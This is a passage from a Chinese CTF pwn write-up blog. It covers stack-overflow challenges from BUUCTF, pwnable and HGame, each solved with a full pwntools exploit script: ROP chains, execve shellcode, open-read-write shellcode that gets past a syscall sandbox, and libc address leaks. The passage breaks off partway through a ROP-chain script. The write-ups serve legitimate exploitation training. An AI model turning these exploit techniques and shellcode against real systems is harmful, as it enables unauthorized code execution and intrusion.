<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line"><span class="comment">#p = process(&#x27;./xhh&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">35402</span> )</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">b&quot;\xE1&quot;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>多跑几次就能出flag</p>
<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
<p>会输出一个printf的地址</p>
<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h1 id="Shellcode-orw"><a href="#Shellcode-orw" class="headerlink" title="Shellcode/orw"></a>Shellcode/orw</h1><p>主要是手写汇编类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>

<p>32位程序：</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210531134743099.png" alt="image-20210531134743099"></p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29914</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BUUCTF-cmcc-simplerop"><a href="#BUUCTF-cmcc-simplerop" class="headerlink" title="BUUCTF_cmcc_simplerop"></a>BUUCTF_cmcc_simplerop</h2><p>保护</p>
<p><img src="/article/Stack%20Overflow/image-20210417163706563.png" alt="image-20210417163706563"></p>
<p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210417163746110.png" alt="image-20210417163746110"></p>
<p>很明显的漏洞点，但是参数v4距离返回地址的偏移并不是0x14+4，用gdb调试一下：<br><img src="/article/Stack%20Overflow/image-20210417164011794.png" alt="image-20210417164011794"></p>
<blockquote>
<p>0x20</p>
</blockquote>
<p>找不到能利用的got表之类的东西，但能找到int 0x80，所以可以进行 systemcall</p>
<p><img src="/article/Stack%20Overflow/image-20210417164250630.png" alt="image-20210417164250630"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>

<p>32位程序：</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./simplerop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26044</span>)</span><br><span class="line"></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">binsh_addr = <span class="number">0x80EB584</span></span><br><span class="line">read_addr = <span class="number">0x806CD50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(binsh_addr) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) </span><br><span class="line">payload += p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(binsh_addr) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>返回地址用 pop_edx_ecx_ebx ，需要把 read 函数中的参数 pop 出来。</p>
<h2 id="HGame-letter"><a href="#HGame-letter" class="headerlink" title="HGame letter"></a>HGame letter</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png" alt="20210307191837"></p>
<p>程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode</p>
<p>（当时应该不懂用看沙箱）</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png" alt="20210307194929"></p>
<p>负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./letter&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"><span class="comment">#r.sendline(&#x27;a&#x27;*0x18+p64(0x60105c)+asm(shellcraft.sh()))</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x67616c66</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>发现其他师傅有另外的解法</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">	log.success(a+<span class="string">&#x27;====&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x400AA3</span></span><br><span class="line">p6 = <span class="number">0x400A9A</span></span><br><span class="line">mmmc = <span class="number">0x400A80</span></span><br><span class="line">vuln = <span class="number">0x400958</span></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./letter&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4009BB&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xffffffff</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(p6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x4009DD</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.\n&#x27;</span>)</span><br><span class="line">write_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase = write_leak - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)+asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<p>搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。</p>
<h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><p>保护</p>
<p><img src="/article/Stack%20Overflow/image-20210421165427835.png" alt="image-20210421165427835"></p>
<p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210421165445322.png" alt="image-20210421165445322"></p>
<p>一道写shellcode 的题目，题目意思也很明显是用orw，在pwnable中flag文件是在/home/orw/flag中，但是在buu中直接在当前目录下就有flag文件。</p>
<p>写一个c程序再gcc -s 直接看汇编照着写就差不多了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    fd = open(&#x27;flag&#x27;,0,0);</span><br><span class="line"></span><br><span class="line">    read(fd,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400666 ; __unwind &#123;</span><br><span class="line">.text:0000000000400666                 push    rbp</span><br><span class="line">.text:0000000000400667                 mov     rbp, rsp</span><br><span class="line">.text:000000000040066A                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:000000000040066E                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400677                 mov     [rbp+var_8], rax</span><br><span class="line">.text:000000000040067B                 xor     eax, eax</span><br><span class="line">.text:000000000040067D                 mov     edx, 0</span><br><span class="line">.text:0000000000400682                 mov     esi, 0          ; oflag</span><br><span class="line">.text:0000000000400687                 mov     edi, 666C6167h  ; file</span><br><span class="line">.text:000000000040068C                 mov     eax, 0</span><br><span class="line">.text:0000000000400691                 call    _open</span><br><span class="line">.text:0000000000400696                 mov     [rbp+fd], eax</span><br><span class="line">.text:0000000000400699                 lea     rcx, [rbp+buf]</span><br><span class="line">.text:000000000040069D                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004006A0                 mov     edx, 64h        ; nbytes</span><br><span class="line">.text:00000000004006A5                 mov     rsi, rcx        ; buf</span><br><span class="line">.text:00000000004006A8                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004006AA                 mov     eax, 0</span><br><span class="line">.text:00000000004006AF                 call    _read</span><br><span class="line">.text:00000000004006B4                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004006B8                 mov     edx, 64h        ; n</span><br><span class="line">.text:00000000004006BD                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004006C0                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004006C5                 mov     eax, 0</span><br><span class="line">.text:00000000004006CA                 call    _write</span><br><span class="line">.text:00000000004006CF                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004006D2                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004006D4                 mov     eax, 0</span><br><span class="line">.text:00000000004006D9                 call    _close</span><br><span class="line">.text:00000000004006DE                 mov     eax, 0</span><br><span class="line">.text:00000000004006E3                 mov     rcx, [rbp+var_8]</span><br><span class="line">.text:00000000004006E7                 xor     rcx, fs:28h</span><br><span class="line">.text:00000000004006F0                 jz      short locret_4006F7</span><br><span class="line">.text:00000000004006F2                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<p>open -&gt; read -&gt; write </p>
<p>open</p>
<ul>
<li>ecx = flags 置零即可</li>
<li>edx = mode 置零即可</li>
<li>ebx = filename 文件名</li>
<li>eax = 0x05 系统调用号</li>
</ul>
<p>read</p>
<ul>
<li>ebx = fd 文件指针，就是open的返回值，不需要改变</li>
<li>ecx = buf 缓冲区，指向栈顶位置</li>
<li>edx = count 字节数</li>
<li>eax = 0x03 系统调用号</li>
</ul>
<p>write</p>
<ul>
<li>ebx = fd 文件指针，置为1，打印到屏幕</li>
<li>ecx = buf 缓冲区，指向栈顶</li>
<li>edx = count</li>
<li>eax = 0x04 系统调用号</li>
</ul>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25204</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10001)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./orw&#x27;)</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x804A060</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0x5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">mov ecx,esp;</span></span><br><span class="line"><span class="string">mov edx,0x30;</span></span><br><span class="line"><span class="string">mov eax,0x3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,0x1;</span></span><br><span class="line"><span class="string">mov edx,0x30;</span></span><br><span class="line"><span class="string">mov eax,0x4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;:&#x27;)</span></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((p.recv()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h2><p>pwn函数</p>
<p><img src="/article/Stack%20Overflow/image-20211012162128135.png" alt="image-20211012162128135"></p>
<p>hint函数</p>
<p><img src="/article/Stack%20Overflow/image-20211012162207729.png" alt="image-20211012162207729"></p>
<p><img src="/article/Stack%20Overflow/image-20211012162225485.png" alt="image-20211012162225485"></p>
<p><img src="/article/Stack%20Overflow/image-20211012162149991.png" alt="image-20211012162149991"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li>栈溢出 0x8 个字节</li>
<li>没有<code>nx</code>保护，可以想到往栈中写入<code>shellcode</code>，</li>
<li>hint函数提供了跳转到栈上的指令 <code>jmp esp</code></li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>如果使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p><img src="/article/Stack%20Overflow/image-20211012163420109.png" alt="image-20211012163420109"></p>
<p>长度会过长，参数s长度只有0x20（32），如果写入这个shellcode就无法覆盖返回地址，但可以自己写一个shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">mov eax,0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>shellcode写入栈了，将返回地址写成<code>jmp esp</code>，重新跳到栈上，手动写入<code>sub esp,40;call esp</code>开栈执行，即可获取shell</p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_s_9&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26772</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line">    </span><br><span class="line">jmp_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">mov eax,0xb</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;tell?\n&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x24</span>,<span class="string">&#x27;\x00&#x27;</span>) + p32(jmp_esp) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<h1 id="ROPchain"><a href="#ROPchain" class="headerlink" title="ROPchain"></a>ROPchain</h1><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210531133221600.png" alt="image-20210531133221600"></p>
<p>先去Options - Stack pointer 勾选上，然后在上图黄色处右键 change stack pointer</p>
<p><img src="/article/Stack%20Overflow/image-20210531133152955.png" alt="image-20210531133152955"></p>
<p><img src="/article/Stack%20Overflow/image-20210531133309555.png" alt="image-20210531133309555"></p>
<p>函数很简单</p>
<p><img src="/article/Stack%20Overflow/image-20210531133332120.png" alt="image-20210531133332120"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>

<p><img src="/article/Stack%20Overflow/image-20210531133403028.png" alt="image-20210531133403028"></p>
<p>手动加上偏移，导入<code>from struct import pack</code> </p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    pa = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    pa = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29696</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    pa = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span 